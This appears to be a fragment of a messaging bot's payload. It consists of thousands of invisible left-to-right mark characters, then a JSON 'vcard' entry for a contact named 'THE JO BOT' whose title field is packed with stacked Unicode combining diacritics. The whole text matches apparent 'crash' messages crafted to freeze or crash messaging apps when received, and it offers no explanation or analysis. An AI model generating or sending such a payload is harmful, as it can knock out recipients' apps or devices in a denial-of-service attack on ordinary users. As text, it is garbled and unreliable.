‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎",
"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;🔥 THE JO BOT 🔥\nORG:\nTITLE:.̸̸̶̛̞̜͊̍̂͒̋̈̉ͭ̀͋͂́͟͜͜͢͜͡͡͡͏.̹͙̬̭̳͍̙̰̜̞͈ͨ̽̌ͨ̑̂̒̚҉̴̴̶̵̶̡͘͘͟͝͝͏̶̶̢̢̛̀͢.̶̡̨̛̞̮̙ͯ͂ͫ̀̆̍ͮ̆̓͛̅ͦ̽́̇̉̋͋̀̚̕͜͜͡͡.̴̢̗̘͕͍̖͉̮̱ͪ͋ͧͭͬ̌͗̓͐̀̚͠.̷̡͙̅̽̉̈́̏͋ͧ̕҉̸̴̡̧̧͢͢͡͞͏.̴̸̨̛̝̮̖͕̯͉̔̄̽ͥͭͬ̄̈́̍ͭ͑̆ͬ͐͜͝͡͞͝.̸̸̸̶̸̧̡̧̱̲̙̱̜̞̰̅̔͑͂ͧͬͬ͌̒̈́́͘͜͠͝.̸̴̷̵̡̢̝̟̯͎̘͓̘̀.̶̨̧̠͖̬̥̫͇̲̩̖̰̥͚̠̞̠̥̅͌̃́͟͠͝.̶̺̮̞̱̜͎̪ͭͤ̓̃̍͛̅ͤ̓̕͜҉͜.̨̢̮̣͍͙̦͇̺̞̅ͨ͒͌̑͋̅̍͒͑ͨ̃͒̕͝͞͝.̲͙̩̬͖̻̳͍͇̹̙̙ͦ̓ͥ̿̒͐ͥ̽̐ͪ̋̎̎̌̊̓ͨͨͬͅ͏̶.̵̬͇͇̻̮̜̹̰̭͓̲̻̻̘͖͎̟͖͇̀̃̄̐̑͑̓̕͢͟͡͝ͅ҉̛͡҉̀͟.̯̤̺̙̰̠͕̆̆͗͂҉̸̛.͙̜̂̀ͯ̓͗͑̈ͤ͐̋̔͑ͭ̄̄̃̋̀̀͢͏̶̴̵̨̡̛́̀̀̕͘͘͜͟͝͡.̶̛̜̺̥͙͉̼̱̪̰͍̫̗̻̀̀̀͘̕͘͘͢͟͢͟͟͟͜.̗̖̖̞̻̼̏̋͛͑͐ͪ҉̀͠͞͡͝.̷̶̧̧̧̘̠͇̒̓ͬ̓̃͒̇̏ͪ̓̈́͗̓͛͋̈͌ͨ̕͘̕͘͘͜͢͢͞͡͞͠.̷̵̜̣̟̺͍̳͕ͬͪ̌͛ͬ̿́̀̕͟҉҉̴̢̧͢.͕̙͍̖̮͉̣̥̑̃̐͗̂̀҉҉̸̴̢̛́̀́͘̕͢͝͠҉̵̴̕͘.̷̶̺̤̮͙͖̞͈̱̗͙͍͙̤͆͌ͮ̂̃ͪ̐͆̌͗ͬ͢͢͞͞ͅ.̴̷̧̧̛̫̰̮̳͚̤̟̪͔̖ͭ̄͑́́́̀͘̕̕͡.̪͙̦̎̓̀̕͜͏̷̢̛͜͢͢͞.̷̸̵̸̧̧̨̧̧̱̲̝͇̟̣̲̲͇͎̬͖͚̯̳ͯ̅̈́̓̐́͟͠.͇͇̟̣͖̞̥̟͖̞͇͉̳͉̎̌̽̓ͅ҉̷̴͘.̵̸̴̷̨̢̨̧̛̲͆̈̒̃̎̽ͯ͊ͮ͛ͯ̃̎̏͌̑ͬ̀̕͜͠.̴̣̘̺̺̤͙͙̼̠̘̭̱̰̪̙̤̋ͦ̑ͥ͗ͨͥ͂͒͋ͤͣͯ̑̽ͪ̄ͨͨ̚͢͟͏͏̢́͝͏̸̨̢̕͞.̣̠̦͓̠̟͔͖͚͔͙̖͇͎͕̰̟̎҉̷̶̴̷̢̨͟͏.̴̨̼̬̗̲͕ͣ̉͐͑̏̍ͩ͊́̚̕͝͞͞.̷̵̢̧̝̥̺͚̭̰͉̬͙͇̼͙̥̳͉͆̀́́͘͘͘͘͘̕͟͢͠͝ͅͅ.